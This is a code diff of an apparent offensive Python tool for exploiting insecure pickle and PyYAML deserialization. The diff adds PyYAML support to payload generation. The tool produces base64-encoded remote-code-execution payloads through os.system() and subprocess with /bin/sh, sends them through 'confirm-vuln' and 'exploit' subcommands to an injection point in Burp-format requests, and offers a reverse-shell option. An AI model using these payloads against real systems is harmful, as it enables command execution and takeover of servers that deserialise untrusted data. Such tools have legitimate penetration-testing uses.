@@ -10,6 +10,7 @@ import sys
 import math
 import signal
 import subprocess
+import yaml
 
 import requests
 from requests import Request
@@ -30,32 +31,32 @@ def parse_args():
 
     # create the parser for the verify-pickle functionality
     verify_parser = subparsers.add_parser('verify-pickle', help="Verify that the string is base64 serialized python pickle object")
-    verify_parser.add_argument('--object', required=False, help="Object to verify(base64)") # todo: raw?
+    verify_parser.add_argument('--object', required=False, help="Pickle object to verify(base64)")
     verify_parser.add_argument('--unsafe', required=False, action='store_true',
                                help='Use dangerous deserialization functions to verify if the string is serialized object.'
-                                     'Dangerous! Should only be used when sure the provided object is safe to deserialize.')
+                                    'Dangerous! Should only be used when sure the provided object is safe to deserialize.')
 
     # create the parser for the generate-payload functionality
     generate_payload_parser = subparsers.add_parser('generate-payload', help="Generate serialized object with custom code")
     generate_payload_parser.add_argument('--cmd', required=False, help='Generate the payload which executes provided command when unpickled')
-    generate_payload_parser.add_argument("--lib", required=False, help="Use tool for specific serialization library: [picle, pyyaml]", choices=['pickle', 'pyyaml'])
-    generate_payload_parser.add_argument('--object', required=False, help="Create payload by appending desired code to the already existing pickle object")
+    generate_payload_parser.add_argument("--lib", required=False, help="Create payload for specific serialization library: [pickle, pyyaml, all]. Default is pickle.", choices=['pickle', 'pyyaml', 'all'])
+    # generate_payload_parser.add_argument('--object', required=False, help="Create payload by appending desired code to the already existing pickle object")
     generate_payload_parser.add_argument('--raw', action='store_true', required=False, help="Include raw bytes representation of payloads.")
 
     # create the parser for the confirm-vuln functionality
     confirm_vuln_parser = subparsers.add_parser('confirm-vuln', help="Test to confirm existence of vulnerability")
     confirm_vuln_parser.add_argument('-r', '--request', required=True, help="Path to a file containing HTTP request in format used in Burp")
-    confirm_vuln_parser.add_argument('-p', '--proxy', required=False, help="Use HTTP/HTTPS proxy when issuing request to confirm vulnerability")
-    confirm_vuln_parser.add_argument("-m", "--marker", required=False, help="Custom marker for injection point in request file. By default the marker is '*'")
-    confirm_vuln_parser.add_argument("--lib", required=False, help="Use tool for specific serialization library: [picle, pyyaml]", choices=['pickle', 'pyyaml'])
+    confirm_vuln_parser.add_argument('-p', '--proxy', required=False, help="Use HTTP/HTTPS proxy when issuing requests to confirm vulnerability")
+    confirm_vuln_parser.add_argument("-m", "--marker", required=False, help="Custom marker for injection point in request file. By default the marker is 'inject_here'")
+    confirm_vuln_parser.add_argument("--lib", required=False, help="Use tool for specific serialization library: [picle, pyyaml, all]", choices=['pickle', 'pyyaml', 'all'])
     confirm_vuln_parser.add_argument("--http", required=False, action='store_true', help="Send requests over http.")
 
     # create the parser for the exploit functionality
     exploit_parser = subparsers.add_parser('exploit', help="Try to exploit the vulnerability and execute custom command.")
     exploit_parser.add_argument('-r', '--request', required=True, help="Path to a file containing HTTP request in format used in Burp")
     exploit_parser.add_argument('-p', '--proxy', required=False, help="Use HTTP/HTTPS proxy when issuing request to exploit vulnerability")
-    exploit_parser.add_argument("-m", "--marker", required=False, help="Custom marker for injection point in request file. By default the marker is '*'")
-    exploit_parser.add_argument("--lib", required=False, help="Use tool for specific serialization library: [picle, pyyaml]", choices=['pickle', 'pyyaml'])
+    exploit_parser.add_argument("-m", "--marker", required=False, help="Custom marker for injection point in request file. By default the marker is 'inject_here'")
+    exploit_parser.add_argument("--lib", required=False, help="Use tool for specific serialization library: [picle, pyyaml, all]", choices=['pickle', 'pyyaml','all'])
     exploit_parser.add_argument("--http", required=False, action='store_true', help="Send requests over http.")
     exploit_parser.add_argument("--revshell", required=False, action='store_true', help="Try a bunch of reverse shell payloads")
     exploit_parser.add_argument('--cmd', required=False, help='Provide command you want to execute')
@@ -189,34 +190,63 @@ def generate_payload() -> list[str]: # todo: nadodati na postojeci pickle objekt
 
     print("[+] Generating payloads ... \n")
     payloads_list = []
+    pickle_payloads_os = []
+    pickle_payloads_subprocess = []
+    yaml_payloads_os = []
+    yaml_payloads_subprocess = []
 
-    print_info("[+] Payloads relying on os module: ")
-    # print()
-    print(f"  [+] Pickle protocols 0-{pickle.HIGHEST_PROTOCOL}")
-    for prot_num in range (pickle.HIGHEST_PROTOCOL + 1):
-        payload = pickle.dumps(os_rce_payload(cmd), protocol=prot_num)
-        print(f"\t[+] Base64 encoded payload num #{prot_num}: ", base64.b64encode(payload).decode("utf-8"))
-        if g_args.raw:
-            print("\t[+] Raw bytes payload: ", payload)
-            print()
-        payloads_list.append(base64.b64encode(payload).decode("utf-8"))
+    if g_args.lib == 'pickle' or g_args.lib == 'all' or g_args.lib == None:
+        print_green(f"  [+] Pickle payloads(protocols 0-{pickle.HIGHEST_PROTOCOL})")
+        for prot_num in range (pickle.HIGHEST_PROTOCOL + 1):
+            # os
+            payload = pickle.dumps(os_rce_payload(cmd), protocol=prot_num)
+            pickle_payloads_os.append({'raw':payload, 'encoded':base64.b64encode(payload).decode("utf-8")})
+            
+            #subprocess
+            payload = pickle.dumps(subprocess_rce_payload(cmd), protocol=prot_num)
+            pickle_payloads_subprocess.append({'raw':payload, 'encoded':base64.b64encode(payload).decode("utf-8")})
 
+        print()
+        print_info("[+] Payloads relying on os.system(): ")
+        for idx, payload in enumerate(pickle_payloads_os):
+            print(f"\t[+] Base64 encoded payload #{idx}: ", payload['encoded'])
+            if g_args.raw:
+                print(f"\t[+] Raw bytes payload: {payload['raw']}\n " )
+        print()
+        print_info("[+] Payloads relying on subprocess.check_output() and /bin/sh: ")
+        for idx, payload in enumerate(pickle_payloads_subprocess):
+            print(f"\t[+] Base64 encoded payload #{idx}: ", payload['encoded'])
+            if g_args.raw:
+                print(f"\t[+] Raw bytes payload: {payload['raw']}\n " )
+
+
+    print("\n"*3)
+    if g_args.lib == "pyyaml" or g_args.lib == 'all':
+        print_green(f"  [+] pyyaml payloads")
+        payload = yaml.dump(os_rce_payload(cmd))
+        yaml_payloads_os.append({'raw':payload, 'encoded':base64.b64encode(payload.encode("utf-8")).decode("utf-8")})
+        
+        #subprocess
+        payload = yaml.dump(subprocess_rce_payload(cmd))
+        yaml_payloads_subprocess.append({'raw':payload, 'encoded':base64.b64encode(payload.encode("utf-8")).decode("utf-8")})
+
+
+        print()
+        print_info("[+] Payloads relying on os.system(): ")
+        for idx, payload in enumerate(yaml_payloads_os):
+            print(f"\t [+] Base64 encoded payload: ", payload['encoded'])
+            if g_args.raw:
+                print(f"\t [+] Raw bytes payload: {repr(payload['raw'])}\n " )
+        print()
+        print_info("[+] Payload relying on subprocess.check_output() and /bin/sh : ")
+        for idx, payload in enumerate(yaml_payloads_subprocess):
+            print(f"\t [+] Base64 encoded payload: ", payload['encoded'])
+            if g_args.raw:
+                print(f"\t [+] Raw bytes payload: {repr(payload['raw'])}\n " )
 
     print()
-    print_info("[+] Payloads relying on subprocess module and /bin/sh shell: ")
-    # print()
-    print(f"  [+] Pickle protocols 0-{pickle.HIGHEST_PROTOCOL}")
-    for prot_num in range (pickle.HIGHEST_PROTOCOL + 1):
-        payload = pickle.dumps(subprocess_rce_payload(cmd), protocol=prot_num)
-        print(f"\t[+] Base64 encoded payload num #{prot_num}: ", base64.b64encode(payload).decode("utf-8"))
-        if g_args.raw:
-            print("\t[+] Raw bytes payload: ", payload)
-            print()
-        payloads_list.append(base64.b64encode(payload).decode("utf-8"))
-    
-    print()
 
-    return payloads_list
+
 
 
 
@@ -224,11 +254,26 @@ def generate_payload() -> list[str]: # todo: nadodati na postojeci pickle objekt
 def generate_payload_silent(cmd) -> list[str]:
         
     payloads_list = []
-    for prot_num in range (pickle.HIGHEST_PROTOCOL + 1):
-        payload_os = base64.b64encode(pickle.dumps(os_rce_payload(cmd), protocol=prot_num)).decode("utf-8")
-        payload_subproc = base64.b64encode(pickle.dumps(subprocess_rce_payload(cmd), protocol=prot_num)).decode("utf-8")
-        payloads_list.append(payload_os)
-        payloads_list.append(payload_subproc)
+
+    if g_args.lib == 'pickle' or g_args.lib == 'all' or g_args.lib == None:
+        for prot_num in range (pickle.HIGHEST_PROTOCOL + 1):
+            # os
+            payload = pickle.dumps(os_rce_payload(cmd), protocol=prot_num)
+            payloads_list.append(base64.b64encode(payload).decode("utf-8"))
+            
+            #subprocess
+            payload = pickle.dumps(subprocess_rce_payload(cmd), protocol=prot_num)
+            payloads_list.append(base64.b64encode(payload).decode("utf-8"))
+
+    if g_args.lib == "pyyaml" or g_args.lib == 'all':
+        # os
+        payload = yaml.dump(os_rce_payload(cmd))
+        payloads_list.append(base64.b64encode(payload.encode("utf-8")).decode("utf-8"))
+        
+        # subprocess
+        payload = yaml.dump(subprocess_rce_payload(cmd))
+        payloads_list.append(base64.b64encode(payload.encode("utf-8")).decode("utf-8"))
+
 
     return payloads_list
 
